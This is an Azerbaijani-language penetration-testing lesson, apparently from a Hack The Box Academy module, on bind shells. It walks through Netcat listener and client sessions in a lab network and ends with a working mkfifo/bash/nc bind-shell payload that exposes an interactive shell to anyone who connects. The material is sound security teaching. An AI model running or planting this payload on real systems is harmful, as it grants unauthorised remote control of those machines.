## Bağlanmış Şelllər (Bind Shells)

Bir çox halda, biz yerli və ya uzaq şəbəkədəki bir sistemdə şell (shell) qurmağa çalışacağıq. Bu o deməkdir ki, biz hücum kompüterimizdəki terminal emulyatoru tətbiqindən istifadə edərək, onun şelli vasitəsilə uzaq sistemi idarə etməyə çalışacağıq. Bu, adətən, **Bağlanmış (Bind)** və/və ya **Tərs (Reverse)** şelldən istifadə etməklə edilir.

### Bu Nədir?

**Bağlanmış şell** (bind shell) ilə **hədəf sistem** bir dinləyici (listener) işə salır və penetration test edənin sistemindən (hücum kompüteri) gələn bağlantını gözləyir.

Bind Example

<img width="2101" height="1220" alt="image" src="https://github.com/user-attachments/assets/70c4d197-1dcd-4d08-99c9-506ad8907a7a" />

Şəkildə görüldüyü kimi, biz birbaşa **IP ünvanı** və hədəfdə dinləyən **port** vasitəsilə qoşulacağıq. Bu yolla şell əldə etməklə əlaqəli bir çox çətinliklər ola bilər. Nəzərə alınmalı bəzi məqamlar:

  * Hədəfdə artıq bir dinləyici (listener) işə salınmış olmalıdır.
  * Əgər dinləyici işə salınmayıbsa, biz bunu etməyin bir yolunu tapmalıyıq.
  * Administratorlar, adətən, şəbəkənin kənarında (ictimai üzə) ciddi **gələn (incoming) firewall qaydaları** və NAT (PAT tətbiqi ilə) konfiqurasiya edirlər, buna görə də biz artıq daxili şəbəkədə olmalıyıq.
  * Əməliyyat sistemi firewallları (Windows və Linux-da) etibarlı şəbəkə əsaslı tətbiqlərlə əlaqəli olmayan əksər gələn əlaqələri bloklayacaq.

Əməliyyat sistemi firewallları bir şell qurarkən çətinlik yarada bilər, çünki əlaqəmizin uğurla işləməsi üçün **IP ünvanlarını**, **portları** və istifadə olunan **aləti** nəzərə almalıyıq. Yuxarıdakı nümunədə, dinləyicini işə salmaq üçün istifadə olunan tətbiq **GNU Netcat** adlanır. **Netcat (nc)** **"İsveçrə Ordu Bıçağı"** (Swiss-Army Knife) hesab olunur, çünki TCP, UDP və Unix soketləri üzərində işləyə bilir. O, IPv4 və IPv6 istifadə edə, soketləri aça və dinləyə, proksi kimi işləyə və hətta mətn girişi və çıxışı ilə məşğul ola bilir. Biz hücum kompüterində **nc**-ni **müştəri (client)** kimi, hədəfi isə **server** kimi istifadə edəcəyik.

Gəlin, Netcat ilə təcrübə edərək və heç bir məhdudiyyətin olmadığı eyni şəbəkədəki bir host ilə bağlanmış şell (bind shell) əlaqəsi quraraq bu barədə daha dərindən məlumat əldə edək.

-----

## GNU Netcat ilə Praktika

Əvvəlcə, hücum kompüterimizi və ya **Pwnbox**-umuzu işə salmalı və Akademiyanın şəbəkə mühitinə qoşulmalıyıq. Sonra hədəfimizin işə salındığından əmin olmalıyıq. Bu ssenaridə biz bağlanmış şellin mahiyyətini anlamaq üçün bir Ubuntu Linux sistemi ilə qarşılıqlı əlaqədə olacağıq. Bunu etmək üçün müştəri və serverdə **netcat (nc)** istifadə edəcəyik.

SSH ilə hədəf kompüterə qoşulduqdan sonra bir Netcat dinləyicisi işə salın:

### № 1: Server - Hədəf Netcat Dinləyicisini İşə Salır

```
Target@server:~$ nc -lvnp 7777
Listening on [0.0.0.0] (family 0, port 7777)
```

Bu vəziyyətdə, hədəf bizim **serverimiz**, hücum kompüteri isə **müştərimiz** olacaq. Enter düyməsini basdıqdan sonra dinləyici işə başlayır və müştəridən bir əlaqə gözləyir.

Müştəriyə (hücum kompüterinə) qayıdıb, serverdə işə saldığımız dinləyiciyə qoşulmaq üçün **nc** istifadə edəcəyik.

### № 2: Müştəri - Hücum kompüteri hədəfə qoşulur

```
nijatmansimov@htb[/htb]$ nc -nv 10.129.41.200 7777
Connection to 10.129.41.200 7777 port [tcp/*] succeeded!
```

Diqqət edin ki, biz həm müştəridə, həm də serverdə **nc** istifadə edirik. Müştəri tərəfdə biz serverin IP ünvanını və dinləmək üçün konfiqurasiya etdiyimiz portu (7777) təyin edirik. Uğurla qoşulduqdan sonra, yuxarıda göstərildiyi kimi müştəridə **`succeeded!`** mesajını və aşağıda göründüyü kimi serverdə **`received!`** mesajını görə bilərik.

### № 3: Server - Hədəf müştəridən əlaqə qəbul edir

```
Target@server:~$ nc -lvnp 7777
Listening on [0.0.0.0] (family 0, port 7777)
Connection from 10.10.14.117 51872 received!
```

Bilin ki, bu, hələ **düzgün bir şell deyil**. Bu, sadəcə qurduğumuz bir Netcat TCP sessiyasıdır. Onun funksionallığını müştəri tərəfdə sadə bir mesaj yazaraq və onun server tərəfdə qəbul edildiyini görməklə yoxlaya bilərik.

### № 4: Müştəri - Hücum kompüteri "Hello Academy" mesajını göndərir

```
nijatmansimov@htb[/htb]$ nc -nv 10.129.41.200 7777
Connection to 10.129.41.200 7777 port [tcp/*] succeeded!
Hello Academy
```

Mesajı yazıb enter düyməsini basdıqdan sonra mesajın server tərəfdə qəbul edildiyini görəcəyik.

### № 5: Server - Hədəf "Hello Academy" mesajını qəbul edir

```
Victim@server:~$ nc -lvnp 7777
Listening on [0.0.0.0] (family 0, port 7777)
Connection from 10.10.14.117 51914 received!
Hello Academy
```

**Qeyd:** Akademiya şəbəkəsində (10.129.x.x/16) olarkən, başqa bir akademiya tələbəsi ilə əməkdaşlıq edərək onların hədəf kompüterinə qoşula və bu modulda təqdim olunan anlayışları tətbiq edə bilərik.

-----

## Netcat ilə Əsas Bağlanmış Şell Qurmaq

Biz Netcat-ı müştəri və server arasında mətn göndərmək üçün istifadə edə biləcəyimizi göstərdik, lakin bu, bağlanmış şell deyil, çünki biz ƏS və fayl sistemi ilə qarşılıqlı əlaqədə ola bilmirik. Biz yalnız Netcat tərəfindən qurulan boru kəməri (pipe) daxilində mətn ötürə bilirik. Gəlin, əsl bağlanmış şell qurmaq üçün şellimizi təmin etmək məqsədilə Netcat istifadə edək.

Server tərəfdə, müştəri qoşulmağa cəhd etdikdə sistemə bir şellin təmin edilməsini təmin etmək üçün **kataloqu**, **şelli**, **dinləyicini**, bəzi **boru kəmərlərini (pipelines)** və **giriş və çıxışın yönləndirilməsini** təyin etməliyik.

### № 1: Server - Bash şellini TCP sessiyasına bağlamaq

```
Target@server:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```

Yuxarıdakı əmrlər bizim **faydalı yükümüz (payload)** hesab olunur və biz bu faydalı yükü əl ilə çatdırdıq. Biz görəcəyik ki, faydalı yüklərimizdəki əmrlər və kod onu çatdırdığımız hədəf əməliyyat sistemindən asılı olaraq dəyişəcək.

Serverdə bir şell təmin edildiyi üçün, müştəriyə qayıdıb serverə qoşulmaq üçün Netcat istifadə edin.

### № 2: Müştəri - Hədəfdəki bağlanmış şellə qoşulmaq

```
nijatmansimov@htb[/htb]$ nc -nv 10.129.41.200 7777
Target@server:~$
```

Görəcəyik ki, biz hədəflə uğurla bağlanmış şell sessiyası qurmuşuq. Unutmayın ki, bu ssenaridə biz həm hücum kompüterimizə, həm də hədəf sistemə tam nəzarət edirdik, bu isə tipik vəziyyət deyil. Biz bu təcrübələri bağlanmış şellin əsaslarını və onun heç bir təhlükəsizlik nəzarəti (NAT aktivləşdirilmiş routerlər, aparat firewallları, Veb Tətbiq Firewallları, IDS, IPS, ƏS firewallları, endpoint mühafizəsi, autentifikasiya mexanizmləri və s.) və ya istismar tələb olunmadan necə işlədiyini anlamaq üçün həyata keçirdik. Bu fundamental anlayış, daha çətin və real ssenarilərə, xüsusən də zəif sistemlərlə işləməyə başladıqda faydalı olacaq.

Bu bölmənin əvvəlində qeyd edildiyi kimi, bağlanmış şellə qarşı müdafiənin daha asan olduğunu xatırlamaq da yaxşıdır. Əlaqə **gələn** olduğu üçün, dinləyici işə salınarkən standart portlardan istifadə edilsə belə, firewalllar tərəfindən aşkar edilməsi və bloklanması daha ehtimal olunur. Bunun öhdəsindən gəlməyin yolları var, bu isə növbəti bölmədə müzakirə edəcəyimiz **tərs şell** (reverse shell) istifadə etməklə mümkündür.





















